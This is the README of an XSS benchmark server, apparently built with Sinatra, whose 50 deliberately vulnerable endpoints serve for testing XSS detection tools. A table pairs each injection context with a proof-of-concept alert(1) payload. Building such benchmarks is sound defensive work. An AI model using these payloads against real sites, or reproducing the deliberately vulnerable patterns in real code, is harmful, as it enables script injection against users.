# XSS Benchmark

A Sinatra-based XSS vulnerability benchmark server for testing XSS detection tools.

## Overview

This server provides 50 different XSS vulnerable endpoints, each demonstrating a different XSS injection context. All endpoints use the GET method and accept a `query` parameter.

## Installation

```bash
bundle install
```

## Usage

```bash
bundle exec ruby app.rb
```

The server will start on `http://0.0.0.0:3000`.

## Endpoints

| Endpoint | XSS Context | Example Payload |
|----------|-------------|-----------------|
| GET /1?query= | HTML body | `<script>alert(1)</script>` |
| GET /2?query= | Unquoted attribute | `test onclick=alert(1)` |
| GET /3?query= | Single-quoted attribute | `' onclick='alert(1)` |
| GET /4?query= | Double-quoted attribute | `" onclick="alert(1)` |
| GET /5?query= | href attribute | `javascript:alert(1)` |
| GET /6?query= | Script (single quote) | `';alert(1);//` |
| GET /7?query= | Script (double quote) | `";alert(1);//` |
| GET /8?query= | onclick handler | `');alert(1);//` |
| GET /9?query= | img src | `x" onerror="alert(1)` |
| GET /10?query= | img onerror | `');alert(1);//` |
| GET /11?query= | style attribute | `red;background-image:url(javascript:alert(1))` |
| GET /12?query= | textarea | `</textarea><script>alert(1)</script>` |
| GET /13?query= | title tag | `</title><script>alert(1)</script>` |
| GET /14?query= | iframe src | `javascript:alert(1)` |
| GET /15?query= | SVG text | `<script>alert(1)</script>` |
| GET /16?query= | data attribute | `" onclick="alert(1)` |
| GET /17?query= | meta refresh | `0;url=javascript:alert(1)` |
| GET /18?query= | object data | `javascript:alert(1)` |
| GET /19?query= | embed src | `javascript:alert(1)` |
| GET /20?query= | form action | `javascript:alert(1)` |
| GET /21?query= | body onload | `');alert(1);//` |
| GET /22?query= | onmouseover handler | `');alert(1);//` |
| GET /23?query= | onfocus handler | `');alert(1);//` |
| GET /24?query= | oninput handler | `');alert(1);//` |
| GET /25?query= | onchange handler | `');alert(1);//` |
| GET /26?query= | JS template literal | `${alert(1)}` |
| GET /27?query= | innerHTML (DOM XSS) | `<img src=x onerror=alert(1)>` |
| GET /28?query= | document.write (DOM XSS) | `<script>alert(1)</script>` |
| GET /29?query= | HTML comment | `--><script>alert(1)</script><!--` |
| GET /30?query= | style tag | `red;}</style><script>alert(1)</script>` |
| GET /31?query= | base tag href | `javascript:alert(1)//` |
| GET /32?query= | link stylesheet | `javascript:alert(1)` |
| GET /33?query= | script src | `data:text/javascript,alert(1)` |
| GET /34?query= | img srcset | `x" onerror="alert(1)` |
| GET /35?query= | video poster | `javascript:alert(1)` |
| GET /36?query= | video src | `javascript:alert(1)` |
| GET /37?query= | audio src | `javascript:alert(1)` |
| GET /38?query= | source src | `javascript:alert(1)` |
| GET /39?query= | track src | `javascript:alert(1)` |
| GET /40?query= | formaction | `javascript:alert(1)` |
| GET /41?query= | iframe srcdoc | `<script>alert(1)</script>` |
| GET /42?query= | SVG onload | `');alert(1);//` |
| GET /43?query= | SVG href | `javascript:alert(1)` |
| GET /44?query= | MathML | `<script>alert(1)</script>` |
| GET /45?query= | details ontoggle | `');alert(1);//` |
| GET /46?query= | marquee onstart | `');alert(1);//` |
| GET /47?query= | contenteditable onfocus | `');alert(1);//` |
| GET /48?query= | autofocus onfocus | `');alert(1);//` |
| GET /49?query= | JSON context | `"};alert(1);//` |
| GET /50?query= | noscript tag | `</noscript><script>alert(1)</script>` |

## License

MIT License